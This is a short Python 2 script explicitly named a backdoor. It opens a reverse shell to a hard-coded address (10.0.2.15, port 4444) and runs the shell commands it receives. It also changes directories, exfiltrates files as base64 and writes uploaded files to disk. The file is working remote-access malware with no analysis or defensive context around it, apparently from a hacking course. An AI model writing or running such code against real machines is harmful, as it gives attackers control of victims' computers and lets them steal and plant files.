#!/usr/bin/env python

import socket, subprocess, json, os, base64


class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
	
	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)
		
	def reliable_receive(self):
		json_result = ""
		while True:
			try:
				json_result = json_result + self.connection.recv(1024)
				return json.loads(json_result)
			except ValueError:
				continue

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)

	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directory to " + path

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload Successful"

	def run(self):
		while True:	
			command = self.reliable_receive()
			
			try:
				if command[0] == "exit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result = self.execute_system_command(command)
			except Exception:
				command_result = "[-] Error during command execution."

			self.reliable_send(command_result)


my_backdoor = Backdoor("10.0.2.15", 4444)
my_backdoor.run()
